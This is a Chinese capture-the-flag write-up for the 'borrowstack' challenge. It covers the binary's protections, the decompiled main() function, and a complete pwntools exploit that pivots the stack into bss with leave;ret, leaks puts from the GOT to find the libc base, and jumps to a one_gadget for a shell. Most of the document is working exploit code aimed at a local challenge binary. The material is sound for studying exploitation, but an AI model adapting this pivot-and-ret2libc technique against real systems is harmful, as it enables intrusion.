# 新春战“疫” Borrowstack

### 0x1 分析

看一下安全性：

```shell
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

地址是固定的，而且没有CANARY保护。

看一下`main()`函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-60h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts(&s);
  read(0, &buf, 0x70uLL);
  puts("Done!You can check and use your borrow stack now!");
  read(0, &bank, 0x100uLL);
  return 0;
}
```

溢出点知足够溢出EBP和返回地址。

但是后面我们在`bss`段可以构造我们的ROP链。

所以就先泄漏`libc`地址，然后再执行`one_gadget`。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
# from LibcSearcher import *

context.arch = 'amd64'
context.log_level = 'debug'
p = process('./borrowstack')
elf = ELF('./borrowstack')

context.terminal = ['tmux', 'splitw', '-h']
def debug(p, cmd):
    '''cmd = 'b *%d\n' %(proc_base+breakaddr)'''
    gdb.attach(p, cmd)
    pause()

puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
main_puts_addr = 0x400656
stack = 0x601080 + 0x30
leave_ret = 0x400699
pop_rdi_ret = 0x400703

payload = flat([
    'a'*0x60,
    stack,
    leave_ret
])
p.sendafter("Ｗelcome to Stack bank,Tell me what you want\n", payload)

payload = flat([
    'a' * 0x30,
    stack,
    pop_rdi_ret,
    puts_got,
    puts_plt,
    main_puts_addr,
])
p.sendafter("Done!You can check and use your borrow stack now!\n", payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
# libc = LibcSearcher('puts', puts)
# libc_base = read - libc.dump('puts')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_addr - libc.symbols['puts']
onegadget = libc_base + 0x4526a
print hex(libc_base)
pause()

payload = flat([
    'a'*0x60,
    stack,
    leave_ret
])
p.sendafter("Ｗelcome to Stack bank,Tell me what you want\n", payload)
payload = flat([
    'a' * 0x30,
    stack,
    onegadget
]) 
p.sendafter("Done!You can check and use your borrow stack now!\n", payload)

p.interactive()
```
